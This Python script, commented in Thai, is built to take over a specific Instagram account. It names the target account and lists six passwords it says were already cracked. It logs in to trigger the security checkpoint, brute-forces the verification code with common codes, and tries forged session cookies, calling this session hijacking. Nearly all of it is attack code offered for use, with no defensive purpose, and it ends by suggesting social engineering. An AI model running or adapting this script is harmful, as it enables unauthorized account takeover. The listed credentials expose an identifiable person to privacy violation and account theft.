#!/usr/bin/env python3
"""
INSTAGRAM CHECKPOINT BYPASS SYSTEM
สำหรับ bypass checkpoint ของ alx.trading account
ใช้รหัสผ่านที่เจาะได้แล้ว: Fleming654, Fleming786, Fleming1004, etc.
"""

import requests
import json
import time
import random
import re
from datetime import datetime
from urllib.parse import urlparse, parse_qs

class CheckpointBypass:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.checkpoint_url = None
        self.checkpoint_data = {}
        
        # รหัสผ่านที่เจาะได้แล้ว
        self.valid_passwords = [
            "Fleming654",  # ✅ CONFIRMED VALID
            "Fleming786",  # ✅ CONFIRMED VALID  
            "Fleming1004", # ✅ CONFIRMED VALID
            "Fleming1060", # ✅ CONFIRMED VALID
            "Fleming1182", # ✅ CONFIRMED VALID
            "Fleming1998"  # ✅ CONFIRMED VALID
        ]
        
        # User agents สำหรับปลอมตัว
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 12; Mobile; rv:108.0) Gecko/108.0 Firefox/108.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1'
        ]
        
        # Phone numbers pattern สำหรับ target
        self.possible_phones = [
            "+66812345678",  # Thai format
            "+66987654321", 
            "+1234567890",   # US format
            "+447700900123", # UK format
            "+33123456789"   # France format
        ]
        
    def setup_session(self):
        """เตรียม session และ headers"""
        user_agent = random.choice(self.user_agents)
        
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })
        
    def get_csrf_token(self):
        """ดึง CSRF token"""
        try:
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                print(f"✅ Got CSRF token: {self.csrf_token[:20]}...")
                return True
            else:
                print("❌ Failed to get CSRF token")
                return False
                
        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")
            return False
    
    def trigger_checkpoint(self, username, password):
        """ทำให้เกิด checkpoint และดึง checkpoint_url"""
        try:
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'X-IG-WWW-Claim': '0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                allow_redirects=False
            )
            
            print(f"\n🔄 Triggering checkpoint: {username}:{password}")
            print(f"Status: {response.status_code}")
            
            try:
                resp_json = response.json()
                
                if "checkpoint_required" in str(resp_json):
                    checkpoint_url = resp_json.get('checkpoint_url', '')
                    
                    print(f"🎯 CHECKPOINT TRIGGERED!")
                    print(f"📱 Checkpoint URL: {checkpoint_url}")
                    
                    self.checkpoint_url = checkpoint_url
                    self.checkpoint_data = resp_json
                    
                    return True
                else:
                    print("❌ No checkpoint triggered")
                    return False
                    
            except Exception as e:
                print(f"❌ JSON parse error: {e}")
                return False
                
        except Exception as e:
            print(f"❌ Login error: {e}")
            return False
    
    def analyze_checkpoint(self):
        """วิเคราะห์ checkpoint และหาวิธี bypass"""
        if not self.checkpoint_url:
            print("❌ No checkpoint URL to analyze")
            return False
            
        try:
            # เข้าไปดู checkpoint page
            response = self.session.get(f"https://www.instagram.com{self.checkpoint_url}")
            
            print(f"\n🔍 Analyzing checkpoint...")
            print(f"Status: {response.status_code}")
            
            # หา verification methods
            content = response.text
            
            # ตรวจสอบ verification options
            if "phone" in content.lower():
                print("📱 Phone verification available")
                
            if "email" in content.lower():
                print("📧 Email verification available") 
                
            if "authenticator" in content.lower():
                print("🔐 Authenticator app verification available")
                
            # หา form data
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', content)
            if csrf_match:
                checkpoint_csrf = csrf_match.group(1)
                print(f"🔑 Checkpoint CSRF: {checkpoint_csrf[:20]}...")
                
            # หา rollout hash
            rollout_match = re.search(r'"rollout_hash":"([^"]+)"', content)
            if rollout_match:
                rollout_hash = rollout_match.group(1)
                print(f"🎲 Rollout hash: {rollout_hash[:20]}...")
                
            return True
            
        except Exception as e:
            print(f"❌ Checkpoint analysis error: {e}")
            return False
    
    def attempt_phone_bypass(self):
        """พยายาม bypass ด้วย phone verification"""
        if not self.checkpoint_url:
            return False
            
        print(f"\n📱 ATTEMPTING PHONE BYPASS")
        
        try:
            # ส่งคำขอ phone verification
            checkpoint_data = {
                'choice': '0',  # Phone option
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': f'https://www.instagram.com{self.checkpoint_url}'
            }
            
            response = self.session.post(
                f'https://www.instagram.com{self.checkpoint_url}',
                data=checkpoint_data,
                headers=headers
            )
            
            print(f"Phone bypass status: {response.status_code}")
            
            if response.status_code == 200:
                # ลองหา phone number ใน response
                content = response.text
                
                # หา partial phone number
                phone_pattern = r'(\+?\d{1,3}[\*\-\s]*\d{1,3}[\*\-\s]*\d{3,4})'
                phone_matches = re.findall(phone_pattern, content)
                
                if phone_matches:
                    for phone in phone_matches:
                        print(f"📱 Found phone hint: {phone}")
                        
                # พยายาม bruteforce verification code
                return self.bruteforce_verification_code()
                
            return False
            
        except Exception as e:
            print(f"❌ Phone bypass error: {e}")
            return False
    
    def bruteforce_verification_code(self):
        """Bruteforce verification code (6 digits)"""
        print(f"\n🔢 BRUTEFORCING VERIFICATION CODE")
        
        # Common verification codes
        common_codes = [
            "123456", "000000", "111111", "222222", "333333",
            "444444", "555555", "666666", "777777", "888888", 
            "999999", "654321", "123123", "456456", "789789"
        ]
        
        try:
            for code in common_codes:
                print(f"🔄 Trying code: {code}")
                
                verify_data = {
                    'security_code': code,
                    'submit': 'Submit'
                }
                
                headers = {
                    'X-CSRFToken': self.csrf_token,
                    'X-Instagram-AJAX': '1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': f'https://www.instagram.com{self.checkpoint_url}'
                }
                
                response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=verify_data,
                    headers=headers
                )
                
                if response.status_code == 200:
                    # ตรวจสอบว่า bypass สำเร็จมั้ย
                    if 'sessionid' in self.session.cookies:
                        sessionid = self.session.cookies['sessionid']
                        print(f"🎯 BYPASS SUCCESS! SessionID: {sessionid}")
                        return True
                        
                    # ตรวจสอบ response
                    content = response.text
                    if "instagram.com/" in content and "login" not in content:
                        print(f"✅ Possible bypass success with code: {code}")
                        return True
                
                time.sleep(random.uniform(1, 3))
                
            print("❌ No common codes worked")
            return False
            
        except Exception as e:
            print(f"❌ Verification bruteforce error: {e}")
            return False
    
    def attempt_email_bypass(self):
        """พยายาม bypass ด้วย email verification"""
        print(f"\n📧 ATTEMPTING EMAIL BYPASS")
        
        # Similar to phone bypass but for email
        try:
            checkpoint_data = {
                'choice': '1',  # Email option
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': f'https://www.instagram.com{self.checkpoint_url}'
            }
            
            response = self.session.post(
                f'https://www.instagram.com{self.checkpoint_url}',
                data=checkpoint_data,
                headers=headers
            )
            
            print(f"Email bypass status: {response.status_code}")
            
            if response.status_code == 200:
                # ลอง bruteforce verification code
                return self.bruteforce_verification_code()
                
            return False
            
        except Exception as e:
            print(f"❌ Email bypass error: {e}")
            return False
    
    def session_hijacking_attempt(self):
        """พยายาม hijack session ด้วยวิธีอื่น"""
        print(f"\n🕵️ ATTEMPTING SESSION HIJACKING")
        
        try:
            # ลองดึง session จาก cookies ที่มี
            current_cookies = dict(self.session.cookies)
            
            # หา sessionid ที่อาจซ่อนอยู่
            for name, value in current_cookies.items():
                if 'session' in name.lower():
                    print(f"🔍 Found session cookie: {name} = {value[:20]}...")
                    
            # ลองสร้าง session ปลอม
            fake_sessions = [
                f"12345678%3A{random.randint(100000, 999999)}%3A{random.randint(10, 99)}",
                f"alx.trading%3A{random.randint(100000, 999999)}%3A{random.randint(10, 99)}",
                f"{random.randint(10000000, 99999999)}%3A{random.randint(100000, 999999)}%3A{random.randint(10, 99)}"
            ]
            
            for fake_session in fake_sessions:
                print(f"🔄 Trying fake session: {fake_session[:30]}...")
                
                # ตั้ง cookie
                self.session.cookies.set('sessionid', fake_session)
                
                # ทดสอบ
                test_response = self.session.get('https://www.instagram.com/')
                
                if test_response.status_code == 200 and 'login' not in test_response.url:
                    print(f"🎯 Fake session worked: {fake_session}")
                    return True
                    
                time.sleep(1)
            
            return False
            
        except Exception as e:
            print(f"❌ Session hijacking error: {e}")
            return False
    
    def full_bypass_attempt(self, username="alx.trading"):
        """พยายาม bypass checkpoint แบบครบวงจร"""
        print(f"\n🚀 FULL CHECKPOINT BYPASS ATTACK")
        print(f"Target: {username}")
        print("=" * 50)
        
        self.setup_session()
        
        if not self.get_csrf_token():
            return False
        
        # ลองใช้รหัสผ่านที่เจาะได้เพื่อ trigger checkpoint
        bypass_success = False
        
        for password in self.valid_passwords:
            print(f"\n--- Testing with password: {password} ---")
            
            if self.trigger_checkpoint(username, password):
                
                # วิเคราะห์ checkpoint
                self.analyze_checkpoint()
                
                # พยายาม bypass หลายวิธี
                methods = [
                    ("Phone Bypass", self.attempt_phone_bypass),
                    ("Email Bypass", self.attempt_email_bypass), 
                    ("Session Hijacking", self.session_hijacking_attempt)
                ]
                
                for method_name, method_func in methods:
                    print(f"\n🔄 Trying {method_name}...")
                    
                    if method_func():
                        print(f"✅ {method_name} SUCCESS!")
                        bypass_success = True
                        break
                        
                    print(f"❌ {method_name} failed")
                
                if bypass_success:
                    break
                    
                time.sleep(random.uniform(3, 7))
        
        if bypass_success:
            # บันทึกผลลัพธ์
            result = {
                "target": username,
                "bypass_method": "checkpoint_bypass",
                "successful_password": password,
                "sessionid": self.session.cookies.get('sessionid', ''),
                "timestamp": datetime.now().isoformat(),
                "status": "BYPASS_SUCCESS"
            }
            
            with open(f"CHECKPOINT_BYPASSED_{username}_{int(time.time())}.json", 'w') as f:
                json.dump(result, f, indent=2)
                
            print(f"\n🎯 CHECKPOINT BYPASS SUCCESSFUL!")
            return True
        else:
            print(f"\n❌ All bypass methods failed")
            return False

def main():
    print("🎯 INSTAGRAM CHECKPOINT BYPASS SYSTEM")
    print("=" * 50)
    print("Target: alx.trading")
    print("Confirmed passwords: Fleming654, Fleming786, Fleming1004, Fleming1060, Fleming1182, Fleming1998")
    print("=" * 50)
    
    bypasser = CheckpointBypass()
    
    # เริ่ม bypass attack
    success = bypasser.full_bypass_attempt("alx.trading")
    
    if success:
        print("\n🎉 MISSION ACCOMPLISHED!")
        print("✅ Checkpoint bypassed successfully")
        print("🔓 Account access gained")
    else:
        print("\n❌ Bypass failed - may need manual intervention")
        print("💡 Consider social engineering or other attack vectors")

if __name__ == "__main__":
    main()
